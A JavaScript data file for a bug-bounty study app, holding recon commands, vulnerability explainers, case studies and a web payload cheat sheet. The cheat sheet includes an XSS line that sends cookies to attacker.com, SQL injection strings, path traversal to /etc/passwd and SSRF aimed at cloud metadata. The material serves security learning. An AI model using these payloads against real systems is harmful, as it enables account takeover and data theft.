// bugbOS Study Data

const mindsetData = [
  { tag: 'Core', color: '#9b59b6', title: 'Upgrade Your Thinking', body: 'Not: "What tool do I need?" — But: "What mental model am I missing?" Think deeper. Hunt smarter.' },
  { tag: 'Strategy', color: '#00e5ff', title: 'Chain Simple Bugs', body: 'Try to chain up from a simple bug to impactful bug. Try that vulnerability from different angles. Focus on logical bugs.' },
  { tag: 'Patience', color: '#ffab00', title: 'Patience = Profit', body: 'The best don\'t bounce after a scan — they dig. Weeks on one target. Detailed notes. Test assumptions over and over.' },
  { tag: 'Strategy', color: '#00e676', title: 'Strategic Recon', body: 'Start from business model, not DNS. Ask: What do they care about? Where does data flow? Map, don\'t guess.' },
  { tag: 'Mindset', color: '#ff2d55', title: 'Business Impact First', body: 'First understand how the business process works and where you can attack to apply impact. What can it lose?' },
  { tag: 'Case Study', color: '#ffab00', title: 'The Boring Target', body: 'Pattern in subdomain names → Exposed Swagger spec → Hidden endpoint → Auth bypass + redirect = ATO. Boring = less competition.' },
];

const reconData = [
  { phase: '🔭 Phase 1: Subdomain Enumeration', items: [
    { title: 'Subfinder + Amass', body: 'subfinder -d target.com -o subs.txt\namass enum -passive -d target.com' },
    { title: 'Certificate Transparency', body: 'crt.sh — search *.target.com for SSL-registered subdomains.' },
    { title: 'Live Host Detection', body: 'httpx -l subs.txt -status-code -title -o live.txt' },
  ]},
  { phase: '🕷️ Phase 2: Content Discovery', items: [
    { title: 'GoSpider', body: 'go-spider -s https://target.com\nParse robots.txt and JS files automatically.' },
    { title: 'Historical URLs (gau)', body: 'echo target.com | gau | wordlistgen | sort\nWayback + OTX + URLScan.' },
    { title: 'waymore', body: 'Also downloads archived responses for hidden params.\ngithub.com/xnl-h4ck3r/waymore' },
  ]},
  { phase: '⚙️ Phase 3: JavaScript Analysis', items: [
    { title: 'xnLinkFinder', body: 'python3 xnLinkFinder.py -i tesla.com -v\nParses inline JS, not just .js files.' },
    { title: 'GAP Burp Extension', body: 'Finds BOTH parameters and paths in Burp Suite.' },
  ]},
  { phase: '🎯 Phase 4: Parameter Discovery', items: [
    { title: 'HUNT Params', body: 'IDOR: user, account, id, number, order\nRCE: cmd, exec, command, ping\nSSRF: url, redirect, uri, path' },
    { title: 'GF Patterns', body: 'cat urls.txt | gf sqli\ncat urls.txt | gf xss\ncat urls.txt | gf ssrf' },
  ]},
];

const vulnData = [
  { name: '🎭 XSS — Cross-Site Scripting', color: '#ff2d55',
    desc: 'Inject scripts into pages viewed by other users. Chain with other bugs for ATO.',
    checks: ['Reflected XSS in search/URL params','Stored XSS in profile fields, comments','DOM-based XSS via location.hash','postMessage XSS — no origin check','Bypass WAF with encoding, case variation','Check innerHTML, eval(), document.write()'],
    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Sends payload in URL</div><div class="atk-arrow-line"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Web App</div></div><div class="atk-arrow"><div class="atk-arrow-text">Reflects script in page</div><div class="atk-arrow-line amber"></div></div><div class="atk-actor"><div class="atk-icon">👤</div><div class="atk-label">Victim</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Hacker crafts malicious URL</div><div class="atk-step"><span class="atk-step-num">2</span>Victim clicks the link</div><div class="atk-step"><span class="atk-step-num">3</span>Script runs in victim browser</div><div class="atk-step"><span class="atk-step-num">4</span>Cookies / session stolen!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Full Account Takeover</span></div></div>`
  },
  { name: '💉 SQL Injection', color: '#ff6d00',
    desc: 'Inject SQL into database queries via input fields, headers, cookies.',
    checks: ['Error-based: single quote test \'','Boolean: 1 AND 1=1 vs 1 AND 1=2','Time-based: SLEEP(5), WAITFOR DELAY','UNION-based: find column count first','sqlmap -u "URL?id=1" --dbs --batch'],
    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Sends ' OR 1=1 --</div><div class="atk-arrow-line purple"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Web App</div></div><div class="atk-arrow"><div class="atk-arrow-text">Broken SQL query</div><div class="atk-arrow-line purple"></div></div><div class="atk-actor"><div class="atk-icon">🗄️</div><div class="atk-label">Database</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload sql">SELECT * FROM users WHERE name='' OR 1=1 --'</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Hacker types ' in login</div><div class="atk-step"><span class="atk-step-num">2</span>App puts input in SQL</div><div class="atk-step"><span class="atk-step-num">3</span>Query returns ALL users</div><div class="atk-step"><span class="atk-step-num">4</span>Full DB dumped!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Full Database Compromise</span></div></div>`
  },
  { name: '🔐 IDOR — Insecure Direct Object Reference', color: '#9b59b6',
    desc: 'Access other users\' objects by changing IDs in requests.',
    checks: ['Change numeric IDs: /users/1001 → /users/1002','Change GUIDs in API calls','Horizontal IDOR: same role, different user','Vertical IDOR: lower role accessing admin','Check all API endpoints, not just UI'],
    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker (ID:101)</div></div><div class="atk-arrow"><div class="atk-arrow-text">Changes ID to 102</div><div class="atk-arrow-line cyan"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">API Server</div></div><div class="atk-arrow"><div class="atk-arrow-text">No auth check!</div><div class="atk-arrow-line cyan"></div></div><div class="atk-actor"><div class="atk-icon">👤</div><div class="atk-label">Victim (ID:102)</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">GET /api/users/<b>102</b>/profile → Returns victim's data</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>View own profile: /users/101</div><div class="atk-step"><span class="atk-step-num">2</span>Change 101→102 in URL</div><div class="atk-step"><span class="atk-step-num">3</span>Server returns victim data</div><div class="atk-step"><span class="atk-step-num">4</span>Private info exposed!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact high">⚠️ IMPACT: Data Leak / Privacy Breach</span></div></div>`
  },
  { name: '🔑 Authentication Flaws', color: '#00e5ff',
    desc: 'Bypass login, session management, MFA, and password reset flows.',
    checks: ['Default credentials: admin/admin, test/test','Username enumeration via error messages','JWT alg:none attack, RS256→HS256 confusion','Password reset: predictable token?','MFA: brute OTP 0000-9999, skip MFA step','Session not invalidated on logout'],
    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Skips MFA step</div><div class="atk-arrow-line cyan"></div></div><div class="atk-actor"><div class="atk-icon">🔒</div><div class="atk-label">Login Page</div></div><div class="atk-arrow"><div class="atk-arrow-text">No server check!</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">🏠</div><div class="atk-label">Dashboard</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">POST /login → Skip /verify-otp → GET /dashboard</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Login with password</div><div class="atk-step"><span class="atk-step-num">2</span>App asks for OTP</div><div class="atk-step"><span class="atk-step-num">3</span>Skip to /dashboard</div><div class="atk-step"><span class="atk-step-num">4</span>Full access without MFA!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Complete Auth Bypass</span></div></div>`
  },
  { name: '⚡ Business Logic', color: '#ffab00',
    desc: 'Exploit the application\'s intended workflow in unintended ways.',
    checks: ['Race conditions in transfers/purchases','Price manipulation: negative values','Workflow bypass: skip payment step','Privilege escalation via mass assignment','Rate limiting bypass on sensitive endpoints'],
    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">Sets price = -$100</div><div class="atk-arrow-line amber"></div></div><div class="atk-actor"><div class="atk-icon">🛒</div><div class="atk-label">Checkout</div></div><div class="atk-arrow"><div class="atk-arrow-text">Refund credited!</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">💰</div><div class="atk-label">Hacker Wallet</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload sql">POST /checkout {"price": -100, "qty": 1} → +$100 refund</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>Intercept checkout request</div><div class="atk-step"><span class="atk-step-num">2</span>Change price to negative</div><div class="atk-step"><span class="atk-step-num">3</span>Server processes it</div><div class="atk-step"><span class="atk-step-num">4</span>Money added to account!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact high">⚠️ IMPACT: Financial Fraud</span></div></div>`
  },
  { name: '🌐 SSRF — Server-Side Request Forgery', color: '#00e676',
    desc: 'Make the server issue requests to internal/cloud resources.',
    checks: ['Test URL params: url=, redirect=, webhook=','Target AWS metadata: 169.254.169.254','Bypass filters with encoding, redirection','Blind SSRF via DNS lookup (interactsh)','Cloud IMDS: GCP, Azure, AWS'],
    anim: `<div class="atk-anim"><div class="atk-flow"><div class="atk-actor"><div class="atk-icon">😈</div><div class="atk-label">Hacker</div></div><div class="atk-arrow"><div class="atk-arrow-text">url=169.254...</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">🖥️</div><div class="atk-label">Web Server</div></div><div class="atk-arrow"><div class="atk-arrow-text">Fetches internal!</div><div class="atk-arrow-line green"></div></div><div class="atk-actor"><div class="atk-icon">☁️</div><div class="atk-label">AWS Metadata</div></div></div><div style="text-align:center;margin:10px 0"><div class="atk-payload idor">GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/</div></div><div class="atk-steps"><div class="atk-step"><span class="atk-step-num">1</span>App has "fetch URL" feature</div><div class="atk-step"><span class="atk-step-num">2</span>Point it to internal IP</div><div class="atk-step"><span class="atk-step-num">3</span>Server fetches from internal</div><div class="atk-step"><span class="atk-step-num">4</span>AWS keys leaked!</div></div><div style="text-align:center;margin-top:12px"><span class="atk-impact critical">💀 IMPACT: Cloud Takeover</span></div></div>`
  },
];

const toolsData = [
  { name: 'Subfinder', desc: 'Fast passive subdomain discovery tool', cmd: 'subfinder -d target.com -o subs.txt' },
  { name: 'Amass', desc: 'In-depth attack surface mapping', cmd: 'amass enum -passive -d target.com' },
  { name: 'httpx', desc: 'Fast HTTP probing for live subdomains', cmd: 'httpx -l subs.txt -status-code -title -o live.txt' },
  { name: 'Nuclei', desc: '3000+ vuln templates by ProjectDiscovery', cmd: 'nuclei -l live.txt -t cves/ -t panels/ -t vulnerabilities/' },
  { name: 'GoSpider', desc: 'Web crawler for link & endpoint discovery', cmd: 'go-spider -s https://target.com -o output/' },
  { name: 'gau', desc: 'Get All URLs from Wayback + OTX + URLScan', cmd: 'echo target.com | gau | sort -u > urls.txt' },
  { name: 'ffuf', desc: 'Fast web fuzzer for content discovery', cmd: 'ffuf -w wordlist.txt -u https://target.com/FUZZ' },
  { name: 'RustScan', desc: 'Modern port scanner — 2-10x faster than nmap', cmd: 'rustscan -a target.com -- -sC -sV' },
  { name: 'xnLinkFinder', desc: 'Parses inline JS for endpoints and params', cmd: 'python3 xnLinkFinder.py -i target.com -v' },
  { name: 'GF Patterns', desc: 'Grep URLs for vulnerable param patterns', cmd: 'cat urls.txt | gf sqli\ncat urls.txt | gf xss\ncat urls.txt | gf ssrf' },
  { name: 'apkleaks', desc: 'Scan APKs for leaked secrets and endpoints', cmd: 'apkleaks -f app.apk -o output.json' },
  { name: 'sqlmap', desc: 'Automated SQL injection detection & exploitation', cmd: 'sqlmap -u "https://target.com?id=1" --dbs --batch' },
  { name: 'Burp Suite', desc: 'Intercept proxy + active scanner', cmd: 'Set proxy: 127.0.0.1:8080\nInstall: BApp Store extensions' },
  { name: 'interactsh', desc: 'OOB interaction server for blind vulns', cmd: 'interactsh-client -v' },
];

const casesData = [
  { title: 'Tesla DOM XSS via postMessage', target: 'Tesla Motors Bug Bounty', bounty: '$500', body: '1. Analyzed Tesla payment page JavaScript\n2. Found postMessage handler with no origin check\n3. Crafted malicious page to send messages\n4. Triggered XSS on payment page\nImpact: Payment page compromise' },
  { title: 'Swagger Spec → ATO Chain', target: 'Anonymous Target', bounty: 'Critical', body: '1. Found pattern in subdomain naming\n2. Discovered exposed Swagger spec → hidden endpoints\n3. Found unauthenticated endpoint\n4. Chained auth bypass + open redirect = Account Takeover\nLesson: Boring targets = less hunters = more bugs' },
  { title: 'SuiteCRM Default Credentials', target: 'COTS Application', bounty: 'P2 High', body: '1. Identified SuiteCRM via Wappalyzer\n2. Tested public demo creds: will/will\n3. Same creds worked on client instance\n4. Full admin access to CRM\nLesson: Always test default and demo credentials' },
  { title: 'Mobile API Scope Expansion', target: 'Uber Eats Mobile App', bounty: 'Varies', body: '1. Decompiled APK with apkleaks\n2. Found internal API endpoints: /rt/gifting/\n3. Endpoints on main domain = in scope\n4. Tested each for IDOR, auth bypass\nLesson: Mobile APIs often have no auth checks' },
  { title: 'JWT Algorithm Confusion', target: 'SaaS Platform', bounty: 'P1 Critical', body: '1. Captured JWT token from login\n2. Decoded: algorithm was RS256\n3. Switched to HS256, signed with public key\n4. Server accepted tampered token as admin\nLesson: Always test JWT alg confusion' },
];

const payloadData = [
  { category: 'XSS', color: '#ff2d55', payloads: [
    { name: 'Basic Alert', payload: '<script>alert(1)</script>' },
    { name: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
    { name: 'SVG onload', payload: '<svg/onload=alert(1)>' },
    { name: 'Quote Break', payload: '"><script>alert(1)</script>' },
    { name: 'JS URL', payload: 'javascript:alert(1)' },
    { name: 'Data URI', payload: 'data:text/html,<script>alert(1)</script>' },
    { name: 'DOM Cookie Steal', payload: '<script>fetch("https://attacker.com?c="+document.cookie)</script>' },
    { name: 'Polyglot', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//' },
  ]},
  { category: 'SQL Injection', color: '#ff6d00', payloads: [
    { name: 'Basic OR', payload: "' OR 1=1 --" },
    { name: 'Comment bypass', payload: "' OR '1'='1'/*" },
    { name: 'UNION columns', payload: "' UNION SELECT NULL,NULL,NULL --" },
    { name: 'Time-based MySQL', payload: "' AND SLEEP(5) --" },
    { name: 'Time-based MSSQL', payload: "'; WAITFOR DELAY '0:0:5' --" },
    { name: 'Error-based', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --" },
    { name: 'Stacked queries', payload: "'; INSERT INTO users VALUES('hack','hack') --" },
  ]},
  { category: 'SSRF', color: '#00e676', payloads: [
    { name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/' },
    { name: 'GCP Metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/' },
    { name: 'Localhost bypass', payload: 'http://127.0.0.1:8080/admin' },
    { name: 'IPv6 localhost', payload: 'http://[::1]/' },
    { name: 'Decimal IP', payload: 'http://2130706433/' },
    { name: 'URL encoding bypass', payload: 'http://127%2e0%2e0%2e1/' },
  ]},
  { category: 'Path Traversal', color: '#9b59b6', payloads: [
    { name: 'Basic', payload: '../../etc/passwd' },
    { name: 'URL encoded', payload: '%2e%2e/%2e%2e/etc/passwd' },
    { name: 'Double encoded', payload: '%252e%252e%252fetc%252fpasswd' },
    { name: 'Windows', payload: '..\\..\\windows\\system32\\drivers\\etc\\hosts' },
    { name: 'Null byte', payload: '../../etc/passwd%00.png' },
  ]},
  { category: 'Auth Bypass', color: '#00e5ff', payloads: [
    { name: 'JWT none alg', payload: 'eyJhbGciOiJub25lIn0.PAYLOAD.' },
    { name: 'SQL auth bypass', payload: "admin'--" },
    { name: 'Mass assignment', payload: '{"role":"admin","isAdmin":true}' },
    { name: 'HTTP verb bypass', payload: 'X-HTTP-Method-Override: DELETE' },
    { name: 'IP spoof header', payload: 'X-Forwarded-For: 127.0.0.1' },
  ]},
];
